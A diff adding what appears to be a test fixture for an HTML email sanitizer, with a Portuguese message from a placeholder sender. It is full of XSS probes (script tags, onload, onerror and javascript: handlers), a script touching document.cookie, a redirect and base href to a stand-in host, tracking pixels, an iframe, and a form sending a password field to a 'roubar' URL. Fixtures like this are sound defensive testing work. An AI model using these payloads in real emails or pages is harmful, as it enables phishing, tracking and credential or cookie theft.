@@ -1,0 +1,20 @@
+From: Alguém <alguem@perigo.invalid>
+To: matilde@exemplo.pt
+Subject: Veja isto
+Date: Tue, 27 Oct 2026 15:00:00 +0000
+Message-ID: <perigo-1@perigo.invalid>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html><head><script>alert('cabeça')</script><meta http-equiv="refresh" content="0;url=https://perigo.invalid"><base href="https://perigo.invalid/"></head>
+<body onload="alert(1)"><h1 style="color:red">Olá</h1>
+<script>document.cookie</script>
+<img src="x" onerror="alert(2)">
+<img src="https://rastreio.invalid/p.gif" width="1" height="1">
+<a href="javascript:alert(3)">clique</a>
+<a href="https://exemplo.pt/ok">ligação boa</a>
+<iframe src="https://perigo.invalid/"></iframe>
+<form action="https://perigo.invalid/roubar"><input name="senha"></form>
+<svg onload="alert(4)"><circle r="1"/></svg>
+<div style="background:url(https://rastreio.invalid/bg.gif)">fundo</div>
+</body></html>
